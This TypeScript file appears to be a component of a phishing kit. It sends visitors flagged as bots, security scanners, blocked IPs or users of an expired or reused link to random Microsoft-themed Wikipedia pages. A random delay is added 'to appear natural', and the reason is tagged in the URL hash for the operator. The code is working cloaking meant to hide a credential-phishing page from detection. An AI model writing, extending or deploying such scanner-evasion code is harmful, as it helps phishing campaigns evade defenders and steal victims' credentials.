/**
 * Silent redirect utility with URL hash debugging
 * Redirects to safe sites with error reason in hash for debugging
 */

export const redirectToSafeSiteWithReason = (reason: string) => {
  const safeSites = [
    'https://en.wikipedia.org/wiki/Microsoft_Exchange_Server',
    'https://en.wikibooks.org/wiki/Microsoft_Office/Things_to_Know_When_Saving',
    'https://en.wikipedia.org/wiki/Cloud_computing',
    'https://en.wikipedia.org/wiki/Microsoft_Office',
  ]

  const base = safeSites[Math.floor(Math.random() * safeSites.length)]

  // Map reasons to hash fragments
  const errorHashes: Record<string, string> = {
    'bot_detected': '#BotDetected',
    'scanner_detected': '#ScannerFound',
    'token_expired': '#TokenExpired',
    'token_invalid': '#InvalidToken',
    'already_used': '#LinkUsed',
    'ip_blocked': '#IPBlocked',
    'too_many_attempts': '#TooManyAttempts',
    'stealth_failed': '#StealthFailed',
  }

  const hash = errorHashes[reason] || '#UnknownError'
  const redirectUrl = `${base}${hash}`


  // Add random delay (0.5-2s) to appear natural
  const delay = Math.floor(Math.random() * 1500) + 500
  setTimeout(() => {
    window.location.href = redirectUrl
  }, delay)
}




